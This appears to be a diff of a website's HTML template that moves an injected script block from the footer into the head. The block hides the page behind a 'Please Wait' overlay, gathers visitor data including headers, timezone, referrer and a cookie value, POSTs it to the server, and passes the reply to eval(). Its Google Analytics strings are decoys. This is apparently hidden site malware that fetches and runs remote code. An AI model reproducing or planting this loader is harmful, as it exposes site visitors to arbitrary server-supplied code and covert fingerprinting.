@@ -1,6 +1,30 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
+
+	<script type="text/javascript">
+//scrollable links
+$(function() {
+$('a.scroll').click(function() {
+if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
+var target = $(this.hash);
+target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
+if (target.length) {
+$('html,body').animate({
+scrollTop: target.offset().top - 94
+}, 2000);
+return false;
+}
+}
+});
+});
+</script> 
+<style>body {display: none;}</style>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+<script>
+$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo486619ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-94726-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:location.href,type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
+</script>
         
         <!-- META -->
         <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">
@@ -248,29 +272,7 @@
 <!--/FOOTER-->
 
 
-<script type="text/javascript">
-//scrollable links
-$(function() {
-$('a.scroll').click(function() {
-if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
-var target = $(this.hash);
-target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
-if (target.length) {
-$('html,body').animate({
-scrollTop: target.offset().top - 94
-}, 2000);
-return false;
-}
-}
-});
-});
-</script> 
-<style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>
-$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo486619ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-94726-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:location.href,type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
-</script>
+
 	
 </body>
 </html>
